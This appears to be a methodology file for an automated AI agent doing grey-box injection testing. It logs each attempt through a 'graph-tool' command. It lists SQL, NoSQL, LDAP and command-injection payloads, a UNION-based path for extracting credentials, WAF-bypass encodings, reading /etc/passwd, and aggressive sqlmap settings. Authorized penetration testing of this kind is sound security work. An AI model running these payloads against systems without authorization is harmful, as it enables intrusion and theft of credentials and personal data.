## OWASP Injection Testing Methodology (Grey-Box)

### Phase 1: Target Assessment and Claim
For each assigned target:
1. Read the graph context for existing intelligence on the target
2. Claim the target before testing:
```bash
graph-tool claim --id "parameter:search_q" --agent "injection-specialist" --ttl 600
```
3. Understand the parameter's context: where it appears, what data it processes, what responses look like

### Phase 2: Detection and Confirmation
Test each parameter systematically. Record EVERY attempt:

**Error-Based Detection:**
```bash
# Test for SQL error disclosure
graph-tool test-attempt \
  --target "parameter:search_q" \
  --vuln-type sqli \
  --technique "error-based detection" \
  --payload "'" \
  --result fail \
  --response-code 200 \
  --response-excerpt "No SQL error in response"
```

Standard detection payloads (test ALL before concluding):
- Error induction: `'`, `"`, `')`, `")`, `;`, `\`
- Boolean logic: `' AND 1=1--`, `' AND 1=2--`, `' OR '1'='1`
- Time delays: `'; WAITFOR DELAY '00:00:05'--`, `' AND SLEEP(5)--`, `1; SELECT pg_sleep(5)`
- NoSQL: `{"$gt":""}`, `{"$ne":""}`, `'; return true; var a='`
- LDAP: `*`, `)(cn=*))(|(cn=*`, `*)(uid=*))(|(uid=*`
- Command injection: `; id`, `| id`, `` `id` ``, `$(id)`, `%0aid`

**Boolean-Based Blind Detection:**
Send paired true/false conditions and compare response lengths/content:
- True condition: `' AND 1=1--` (should return normal results)
- False condition: `' AND 1=2--` (should return empty/different results)
- If responses differ consistently, boolean-blind injection is confirmed

**Time-Based Blind Detection:**
- Measure baseline response time first
- Inject delay payloads and measure difference
- Confirm with multiple delay values (3s, 5s, 7s)
- Time-based is confirmed if delay correlates with payload

### Phase 3: Exploitation (for confirmed injection points)

**SQL Injection Exploitation Path:**
1. Determine database type (MySQL, PostgreSQL, MSSQL, SQLite, Oracle)
2. Enumerate column count with ORDER BY / UNION SELECT NULL
3. Find reflected columns in UNION output
4. Extract: version, current user, database name
5. Enumerate tables and columns
6. Extract high-value data (credentials, PII, tokens)

```bash
# Record successful exploitation
graph-tool finding \
  --target "parameter:search_q" \
  --vuln-type sqli \
  --severity critical \
  --cwe CWE-89 \
  --title "SQL Injection in search parameter" \
  --poc-payload "' UNION SELECT username,password,3,4 FROM users--" \
  --impact "Full database read access — extracted admin credentials" \
  --grants '["db_read","credential_access"]' \
  --requires '["authenticated"]' \
  --evidence-file "deliverables/screenshots/sqli-search.png" \
  --derived-from "test_attempt:ta_XXXX"
```

**NoSQL Injection Exploitation Path:**
1. Confirm operator injection ($gt, $ne, $regex, $where)
2. Enumerate collections via error messages or boolean extraction
3. Extract data using $regex character-by-character or operator chains

**Command Injection Exploitation Path:**
1. Confirm command execution (output-based or time-based)
2. Identify OS type (Linux/Windows) from output
3. Demonstrate impact: read /etc/passwd, whoami, environment variables

### Phase 4: WAF/Filter Bypass (if initial payloads blocked)
Try at least 8 different bypass techniques before classifying as FALSE_POSITIVE:
- Case variation: `UnIoN SeLeCt`
- Comment injection: `UN/**/ION SEL/**/ECT`
- URL encoding: `%27`, `%2527` (double encoding)
- Unicode: `%u0027`
- Null bytes: `%00'`
- Alternative syntax: `UNION ALL SELECT`, `/*!UNION*/ /*!SELECT*/`
- Whitespace alternatives: `UNION%09SELECT`, `UNION%0ASELECT`
- String concatenation: `'||'`, `' + '`, `CONCAT()`

Record each bypass attempt:
```bash
graph-tool test-attempt \
  --target "parameter:search_q" \
  --vuln-type sqli \
  --technique "waf-bypass: double-url-encoding" \
  --payload "%2527%2520OR%25201%253D1--" \
  --result fail \
  --response-code 403 \
  --response-excerpt "Request blocked by WAF"
```

### Phase 5: Classification and Release

After exhaustive testing, classify each target:

- **EXPLOITED**: Data extracted, commands executed, or unauthorized access achieved. Record as `graph-tool finding`.
- **POTENTIAL**: Strong indicators (error messages, timing anomalies) but full exploitation blocked by external factor. Record as `graph-tool lead` with signal-strength high.
- **LEAD**: Weak signal worth further investigation. Record as `graph-tool lead`.
- **FALSE_POSITIVE**: Not injectable after thorough testing. Update parameter: `graph-tool update --id "parameter:search_q" --set "injectable=no,tested_for=sqli"`

Release claimed targets when done:
```bash
graph-tool release --id "parameter:search_q" --agent "injection-specialist"
```

## Persistence Guidelines
- Minimum 3 distinct payload families per target before concluding not injectable
- If WAF detected, minimum 8 bypass attempts before FALSE_POSITIVE classification
- Use `sqlmap` for automated exploitation after manual confirmation
- If blind injection confirmed, dedicate sufficient time for data extraction

## Tool Usage
- **curl**: Manual probing, header inspection, precise payload crafting
- **sqlmap**: Automated exploitation after manual confirmation (`--level=5 --risk=3`)
- **Playwright**: Browser-based testing for form submissions and JavaScript-heavy apps
